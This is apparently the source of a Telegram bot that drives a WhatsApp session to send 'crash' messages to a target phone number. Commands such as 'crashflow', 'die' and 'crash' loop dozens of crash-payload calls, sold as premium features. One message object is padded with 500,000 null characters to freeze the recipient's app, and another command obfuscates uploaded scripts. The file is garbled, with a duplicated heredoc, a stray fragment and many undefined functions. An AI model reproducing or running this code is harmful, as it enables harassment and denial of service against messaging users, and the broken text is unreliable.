






































































































































































































catcat > index.js << 'EOF'
console.log('=== BOT STARTING ===');

const { Telegraf } = require("telegraf");
const fs = require('fs');
const crypto = require('crypto');
const tdxlol = fs.readFileSync('./tdx.jpeg')
const {
    useSingleFileAuthState, 
    makeWASocket, 
    fetchLatestBaileysVersion,
    DisconnectReason
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const axios = require("axios");
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID } = require("./Famzy");

// --- TON CODE ICI ---
// Mets tout ton code existant ici...

// À LA FIN DU FICHIER, AJOUTE :
console.log('=== AVANT BOT LAUNCH ===');

const bot = new Telegraf(BOT_TOKEN);

// Start WhatsApp
const startSesi = async () => {
    console.log('Starting WhatsApp connection...');
    const { state, saveCreds } = useSingleFileAuthState('./session.json');
    const { version } = await fetchLatestBaileysVersion();

    const cella = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: true,
    });

    cella.ev.on('creds.update', saveCreds);
    cella.ev.on('connection.update', (update) => {
        if (update.connection === 'open') {
            console.log('✅ WhatsApp connected!');
        }
    });
    
    return cella;
};

startSesi();

// Commandes Telegram basiques
bot.start((ctx) => ctx.reply('Welcome to Famzy Bot!'));
bot.command('status', (ctx) => ctx.reply('Bot is running!'));

// Lancer le bot
bot.launch().then(() => {
    console.log('🤖 Telegram bot is running...');
});

console.log('=== BOT INITIALIZED ===');
EOF > index.js << 'EOF'
console.log('=== BOT STARTING ===');

const { Telegraf } = require("telegraf");
const fs = require('fs');
const crypto = require('crypto');
const tdxlol = fs.readFileSync('./tdx.jpeg')
const {
    useSingleFileAuthState, 
    makeWASocket, 
    fetchLatestBaileysVersion,
    DisconnectReason
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const axios = require("axios");
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID } = require("./Famzy");

// --- TON CODE ICI ---
// Mets tout ton code existant ici...

// À LA FIN DU FICHIER, AJOUTE :
console.log('=== AVANT BOT LAUNCH ===');

const bot = new Telegraf(BOT_TOKEN);

// Start WhatsApp
const startSesi = async () => {
    console.log('Starting WhatsApp connection...');
    const { state, saveCreds } = useSingleFileAuthState('./session.json');
    const { version } = await fetchLatestBaileysVersion();

    const cella = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: true,
    });

    cella.ev.on('creds.update', saveCreds);
    cella.ev.on('connection.update', (update) => {
        if (update.connection === 'open') {
            console.log('✅ WhatsApp connected!');
        }
    });
    
    return cella;
};

startSesi();

// Commandes Telegram basiques
bot.start((ctx) => ctx.reply('Welcome to Famzy Bot!'));
bot.command('status', (ctx) => ctx.reply('Bot is running!'));

// Lancer le bot
bot.launch().then(() => {
    console.log('🤖 Telegram bot is running...');
});

console.log('=== BOT INITIALIZED ===');
EOF

const { Telegraf } = require("telegraf");
const fs = require('fs');
const crypto = require('crypto');
const tdxlol = fs.readFileSync('./tdx.jpeg')
const {
    WA_DEFAULT_EPHEMERAL, 
    getAggregateVotesInPollMessage, 
    generateWAMessageFromContent, 
    proto, 
    generateWAMessageContent, 
    generateWAMessage, 
    prepareWAMessageMedia, 
    downloadContentFromMessage, 
    areJidsSameUser, 
    getContentType, 
    useSingleFileAuthState, 
    makeWASocket, 
    fetchLatestBaileysVersion,
    DisconnectReason
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const axios = require("axios");

async function getBuffer(url) {
    try {
        const res = await axios.get(url, { responseType: "arraybuffer" });
        return res.data;
    } catch (error) {
        console.error(error);
        throw new Error("Failed to fetch data.");
    }
}

const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./Famzy");

function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "The best 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "The first 🌇";
  } else {
    return "Check Your Time 🌌";
  }
}

const greeting = getGreeting();

// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}

// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Users";
}

// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 ɢʀᴜᴘ ɴʏᴀ ʜᴀʀᴜs ᴅɪ ᴀᴅᴅ sᴀᴍᴀ ᴏᴡɴᴇʀ ʙᴏs ᴋᴜ");
      }
    } else {
      return ctx.reply("❌ ᴋʜᴜsᴜs ɢʀᴜᴘ ʙᴏs!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);
let cella = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    }); 
});

// Fungsi untuk memulai sesi WhatsApp (VERSION CORRIGÉE)
const startSesi = async () => {
    const { state, saveCreds } = useSingleFileAuthState('./session.json');
    const { version, isLatest } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: !usePairingCode,
        browser: ['Mac OS', 'Safari', '10.15.7'],
    };

    cella = makeWASocket(connectionOptions);

    // Sauvegarder les credentials
    cella.ev.on('creds.update', saveCreds);

    // Pairing code jika diaktifkan
    if (usePairingCode && !cella.authState.creds.registered) {
        let phoneNumber = await question(chalk.black(chalk.bgCyan("[❗ ] ENTER PHONE NUMBER\n\n ✅  EXAMPLE : 2348146895993\n ❌  EXAMPLE : 2348127187030\n ✅  EXAMPLE : +2348127187030\n\n ✅  YOUR NUMBER : ")));      
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await cella.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`𝐊𝐎𝐃𝐄 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    cella.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr && usePairingCode) {
            console.log('QR Code reçu');
        }

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp connecté avec succès !'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Connexion WhatsApp perdue ❌.'),
                shouldReconnect ? 'Reconnexion en cours...' : 'Veuillez redémarrer.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });

    return cella;
};

// Mulai sesi WhatsApp
startSesi();

const USERS_PREMIUM_FILE = 'usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addv4(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

// Fungsi untuk supprimer premium
function removePremium(userId) {
    if (usersPremium[userId]) {
        delete usersPremium[userId];
        fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
        return true;
    }
    return false;
}

// Command untuk mengecek status premium
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});

// Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addprem <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addv4(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});

bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delprem <user_id>');
    }

    const targetUserId = args[1];
    const wasDeleted = removePremium(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
});

bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});

// Fungsi untuk mengirim pesan saat proses
const prosesrespone = async (target, ctx) => {
    try {
        const photoUrl = 'https://i.ibb.co/BHyPGJds/shaban-md.jpg';
        const caption = `╭╺╼━─━■「 🔱PROCCES 」■━━─━╾╸
│ ᏟᎻᏆᏞᏞ ҒϴᎡ Ꭺ ՏᎬ Ꮯ🐛
│ © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
╰━━━━━━━━━━━━━━━━⬣`;

        // Envoyer la photo avec la légende
        await ctx.replyWithPhoto(photoUrl, { caption: caption });
        
    } catch (error) {
        console.error('Error sending process response:', error);
        await ctx.reply('❌ Error sending process message');
    }
};

// Command start
bot.start((ctx) => {
    const userName = getPushName(ctx);
    const userStatus = checkUserStatus(ctx.from.id);
    
    ctx.replyWithPhoto(
        { source: './famzy.jpg' },
        {
            caption: `╭╺╼━─━■「 🌟𝐖𝐄𝐋𝐂𝐎𝐌𝐄🌟 」■━━─━╾╸
│ ʜᴇʟʟᴏ 👋 ${userName}
│ ʏᴏᴜʀ sᴛᴀᴛᴜs: ${userStatus}
│ ᴛɪᴍᴇ: ${greeting}
│
│ © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
╰━━━━━━━━━━━━━━━━⬣`
        }
    );
});

// Command pour vérifier le statut WhatsApp
bot.command('status', (ctx) => {
    const status = isWhatsAppConnected ? '✅ Connected' : '❌ Disconnected';
    ctx.reply(`WhatsApp Status: ${status}`);
});

// Démarrer le bot Telegram
bot.launch().then(() => {
    console.log('🤖 Telegram bot is running...');
}).catch(err => {
    console.error('Error starting bot:', err);
});

// Gérer l'arrêt propre
process.once('SIGINT', () => {
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
});

    const keyboard = [
        [
            {
                text: "𝐹𝑎𝑚𝑧𝑦𝐵𝑢𝑔𝑀𝑒𝑛𝑢",
                callback_data: "bugmenu"
            },
            {
                text: "🔱 Support Gb Owner",
                url: "https://t.me/soszoe"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Done response sent');
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await cella.sendMessage(target, {
      text: message
    });
    console.log(`Message sent to ${number}: ${message}`);
  } catch (error) {
    console.error(`Failed to send message to WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp is not connected. Please connect with Pairing Code first.");
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Ancella\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("brat", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah
    if (!text) {
        return ctx.reply("Enter text! Example: /brat text");
    }

    try {
        // Ambil buffer dari API
        const res = await getBuffer(`https://btch.us.kg/brat?text=${encodeURIComponent(text)}`);

        // Kirim sebagai stiker
        await ctx.replyWithSticker(
            { source: res },
            {
                packname: global.packname || "By", // Ganti dengan packname global Anda
                author: global.author || "ꜰᴀᴍᴢʏ-ᴍᴅ",     // Ganti dengan author global Anda
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ An error occurred while creating the sticker.");
    }
});
bot.command("gpt", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah

    if (!text) {
        return ctx.reply("Hi, what can I help you with? Enter text after the command.");
    }

    // Fungsi untuk memanggil API OpenAI
    async function openai(text, logic) {
        try {
            const response = await axios.post(
                "https://chateverywhere.app/api/chat/",
                {
                    model: {
                        id: "gpt-4",
                        name: "GPT-4",
                        maxLength: 32000,
                        tokenLimit: 8000,
                        completionTokenLimit: 5000,
                        deploymentName: "gpt-4",
                    },
                    messages: [
                        {
                            pluginId: null,
                            content: text,
                            role: "user",
                        },
                    ],
                    prompt: logic,
                    temperature: 0.5,
                },
                {
                    headers: {
                        Accept: "/*/",
                        "User-Agent":
                            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    },
                }
            );

            return response.data; // Kembalikan hasil dari API
        } catch (error) {
            console.error("Error while calling API OpenAI:", error);
            throw new Error("An error occurred while processing your request.");
        }
    }

    try {
        const result = await openai(text, ""); // Panggil API OpenAI
        ctx.reply(result); // Kirim respons ke pengguna
    } catch (error) {
        ctx.reply("❌ An error occurred while processing the request.");
    }
});
bot.command("play", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah

    if (!text) {
        return ctx.reply("Enter keywords to search for YouTube videos!\n\nExample: /play Faded by Alan Walker");
    }

    // Tampilkan reaksi pencarian
    await ctx.reply("🔎 Looking for videos...");

    try {
        // Cari video di YouTube
        const ytsSearch = await yts(text);
        const res = ytsSearch.all[0]; // Ambil hasil pertama

        if (!res) {
            return ctx.reply("❌ No results found for the keyword.");
        }

        // Ambil audio dari API
        const apiResponse = await axios.get(`https://aemt.uk.to/download/ytdl?url=${encodeURIComponent(res.url)}`);
        const anu = apiResponse.data;

        if (anu.status) {
            const urlMp3 = anu.result.mp3;

            // Kirim file audio ke pengguna
            await ctx.replyWithAudio(
                { url: urlMp3 },
                {
                    caption: `🎵 *${res.title}*\n👤 Author: ${res.author.name}\n⏱️ Duration: ${res.timestamp}`,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔗 View on YouTube", url: res.url }],
                        ],
                    },
                }
            );
        } else {
            return ctx.reply("❌ Error! No results found.");
        }
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan, coba lagi nanti.");
    }

    // Kirim reaksi selesai
    await ctx.reply("✅ Finished!");
});
bot.command("ytmp3", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil URL dari teks perintah

    if (!text) {
        return ctx.reply("Input YouTube URL parameters!\n\nExample: /ytmp3 <YouTube link>");
    }

    if (!text.startsWith("https://")) {
        return ctx.reply("❌ The link is invalid. It must start with 'https://'");
    }

    // Tampilkan reaksi memproses
    await ctx.reply("🕖 In process...");

    try {
        // Panggil API untuk mengambil audio
        const response = await axios.get(`https://aemt.uk.to/download/ytdl?url=${encodeURIComponent(text)}`);
        const result = response.data;

        if (result.status) {
            const urlMp3 = result.result.mp3;

            // Kirim file audio ke pengguna
            await ctx.replyWithAudio(
                { url: urlMp3 },
                { caption: `🎵 Audio successfully downloaded from: ${text}` }
            );
        } else {
            return ctx.reply("❌ Error! No results found.");
        }

    } catch (error) {
        console.error(error);
        ctx.reply("❌ An error occurred, please try again later.");
    }

    // Kirim reaksi selesai
    await ctx.reply("✅ Finished!");
});
bot.command("enc", async (ctx) => {
    console.log(`Command received: /encrypthard from user: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('😠 Please reply .js file to be encrypted.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Memproses file untuk enkripsi
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    ctx.reply("⚠️ Processing hard code encryption . . .");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = 
            "Powered By Famzy Lee Tech" + 
            "Powered By Famzy Lee Tech";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    await ctx.replyWithDocument(
        { source: encryptedFilePath, filename: `encrypted_${fileName}` },
        { caption: `╭╺╼━─━■「 ✔️ SUCCESS 」■━━─━╾╸\n│ File successfully encrypted!\n│ @famzzy_lee\n╰━━━━━━━━━━━━━━━━⬣` }
    );
});
bot.command("crashflow", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
  await uibuglogger(target);
  await trashdevice(target);
  await crashui2(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
  Crashmetabeta(target, options = false);
      HardUi(target, ptcp = false );  
    CrashUihard(target, options = false); 
    HardUi(target, ptcp = false );  
    Crashmetabeta(target, options = false);
    CrashUihard(target, options = false); 
    await sendCrashMessage(target, quoted = false);
    CrashUihard(target, options = false); 
    await sendCrashMessage(target, quoted = false);
    await CONTRA(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    Crashmetabeta(target, options = false);
    systemUi(target, ptcp = false );
    await thunderblast_notif(target);
    await f10(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await newsLetter(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("die", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50.; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await thunderblast_notif(target);
    await BlankScreen(target, { ptcp: true });
   await thunderblast_notif(target);
    await BlankScreen(target, { ptcp: true });
    await XeonXRobust(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("fawazlekan", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
  await uibuglogger(target);
  await trashdevice(target);
   await thunderblast_notif(target);
   await BlankScreen(target, { ptcp: true });
   await thunderblast_notif(target);
   await BlankScreen(target, { ptcp: true });
   await XeonXRobust(target, { ptcp: true });
   await thunderblast_notif(target);
   await freezefile(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("sysui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 30; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await XeonXRobust(target, { ptcp: true });
    await f10(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await newsLetter(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("crash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 100; i++) {
    await SendCrashTarget(target, { ptcp: true});
    await crashui2(target);
    await crashui2(target);
    await crashui2(target, { ptcp: true });
    await SendCrashTarget(target, { ptcp: true});
    await crashui2(target);
    await crashui2(target);
    await SendCrashTarget(target, { ptcp: true});
    await SendCrashTarget(target, { ptcp: true});
    await SendCrashTarget(target, { ptcp: true});
    await SendCrashTarget(target, { ptcp: true});
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("crash2", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await XeonXRobust(target, { ptcp: true });
    await f10(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await newsLetter(target);
    await freezefile(target, { ptcp: true });
    await thunderblast_notif(target);
    await thunderblast_doc(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("lockui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await XeonXRobust(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
   await thunderblast_notif(target);
    await newsLetter(target);
    await crashui2(target, {ptcp : true});
    await freezefile(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('𝗦𝗲𝗻𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 𝗕𝘆 𝗙𝗮𝗺𝘇𝘆 𝗟𝗲𝗲 𝗧𝗲𝗹𝗲 𝗕𝘂𝗴 𝗕𝗼𝘁.');
});
bot.command("conviteui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: the command 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
  await uibuglogger(target);
  await trashdevice(target);
    await crashui2(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
    await crashui2(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
